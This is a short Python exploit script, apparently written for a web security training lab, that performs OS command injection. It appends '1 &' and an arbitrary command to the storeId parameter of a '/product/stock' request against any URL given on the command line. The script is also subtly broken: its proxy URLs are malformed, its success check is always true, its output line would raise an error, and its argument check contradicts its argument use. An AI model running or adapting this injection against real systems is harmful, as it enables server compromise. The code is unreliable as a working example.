import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def command_injection_exploit(url, command):
    stock_path_url = url +'/product/stock'
    command_injection = '1 &' + command
    parameters = { 'productId' : '1', 'storeId' : command_injection}
    r = requests.post(stock_path_url, data=parameters , verify=False, proxies= proxies)
    if {len(r.text)>3}:
        print("(+) Command Injection is successful...")
        print("(+) Output of the command injection is\n") + r.text
    else:
        print("(+) Command Injection is unsuccessful")

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)        
    url = sys.argv[1]
    command = sys.argv[2]
    print("(+) Exploiting the Command Injection Vulnerability... ")
    command_injection_exploit(url,command) 

if __name__ == '__main__':
    main()